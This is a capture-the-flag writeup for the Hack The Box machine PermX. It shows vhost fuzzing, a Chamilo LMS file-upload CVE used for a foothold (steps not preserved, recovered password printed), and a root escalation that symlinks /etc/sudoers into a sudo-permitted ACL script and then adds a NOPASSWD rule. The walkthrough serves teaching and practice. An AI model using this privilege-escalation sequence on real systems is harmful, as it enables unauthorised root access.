# HTB: PermX — Writeup

**Difficulty:** Easy
**OS:** Linux
**Techniques:** Virtual host fuzzing, Chamilo LMS unauthenticated file upload RCE (CVE-2023-4220), `sudo`-permitted ACL script abuse via symlink to `/etc/sudoers`

---

## Overview

PermX hosts a Chamilo LMS instance on a discovered virtual host (`lms.permx.htb`), vulnerable to CVE-2023-4220 — an unauthenticated arbitrary file upload flaw. *(Note: the original engagement notes for this box did not capture the exact exploitation steps used to turn that vulnerability into a credential — only the recovered credential itself and its result are documented below.)* That credential grants SSH access as `mtz`. Privilege escalation abuses a custom `sudo`-permitted script, `/opt/acl.sh`, which sets file ACLs on files under `/home/mtz/` without properly validating symlinks — pointing it at a symlink to `/etc/sudoers` grants write access to the sudoers file itself, and root follows directly.

---

## Recon

### Nmap (IP)

```
┌─[darkangel@parrot]─[~/HTB/PermX]
└──╼ $../ports.sh 10.10.11.23 nmap/permx
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 21:08 BST
Nmap scan report for 10.10.11.23
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.09 seconds
```

`permx.htb` added to `/etc/hosts` and a second scan run directly against the hostname:

```
┌─[darkangel@parrot]─[~/HTB/PermX]
└──╼ $../ports.sh permx.htb nmap/PermXhtb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 21:13 BST
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
```

The hostname-based scan reveals an "eLEARNING" title, hinting at an LMS platform on the root site.

### Virtual Host Fuzzing

```
┌─[darkangel@parrot]─[~/HTB/PermX]
└──╼ $ffuf -u http://permx.htb -H "HOST: FUZZ.permx.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18

________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 44ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 62ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1538 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

`lms.permx.htb` found running **Chamilo**, an open-source LMS platform. `www` resolves to the same content as the base site. A page on the main site also listed staff names (Noah, Elsie, Ralph, Mia) — noted for potential later use as usernames, though not ultimately needed.

---

## Foothold — CVE-2023-4220 (Chamilo LMS Unauthenticated File Upload)

`lms.permx.htb`'s Chamilo instance matched a known unauthenticated arbitrary file upload vulnerability, **CVE-2023-4220**, with a public PoC available at [Rai2en/CVE-2023-4220-Chamilo-LMS](https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS).

*(The exact steps used against the PoC to go from the vulnerability to a working credential were not preserved in the original notes.)* The result was a recovered credential:

```
03F6lY3uXAP2bkW8
```

This password worked for SSH access as the user `mtz`, and `user.txt` was retrieved from their home directory.

---

## Privilege Escalation — ACL Script Symlink Abuse

`sudo -l` as `mtz` showed passwordless sudo rights on a single custom script:

```
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

The script lets `mtz` grant themself arbitrary ACL permissions on any file — provided the path starts with `/home/mtz/` and doesn't contain `..`. Its path check only inspects the *string* passed in, not where that path actually resolves to on disk — so a symlink placed inside `/home/mtz/` that points elsewhere satisfies the check while the underlying `setfacl` call operates on the symlink's real target.

```
mtz@permx:~$ ln -s /etc/sudoers /home/mtz/sudoers
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/sudoers
mtz@permx:~$ vi sudoers
```

With write access to `/etc/sudoers` granted, `mtz ALL=(ALL:ALL) NOPASSWD: ALL` was appended to the end of the file:

```
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: ALL
```

### Root

```
mtz@permx:~$ sudo /bin/bash
root@permx:/home/mtz# ls
sudoers  user.txt
root@permx:/home/mtz# cd ~
root@permx:~# ls
backup  reset.sh  root.txt
```

`root.txt` retrieved.

![root shell / root.txt on PermX](screenshots/permx_root_flag.png)

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Recon | Vhost fuzzing (`ffuf`) revealing a Chamilo LMS install on a separate subdomain |
| Foothold | CVE-2023-4220 — unauthenticated arbitrary file upload in Chamilo LMS, leading to a recovered SSH credential |
| User | SSH login as `mtz` with the recovered credential |
| PrivEsc | Symlink abuse against a `sudo`-permitted ACL script (`/opt/acl.sh`) whose path validation didn't account for symlink resolution — used to grant write access to `/etc/sudoers` |

---

## Lessons / Takeaways

- A path-prefix check on a string (`$target != /home/mtz/*`) is not the same as confirming the *resolved* file is actually inside that directory — symlinks defeat naive prefix checks like this every time.
- Custom `sudo`-permitted helper scripts are a common privesc vector on "easy" boxes; always read the script's actual validation logic rather than assuming it's airtight.
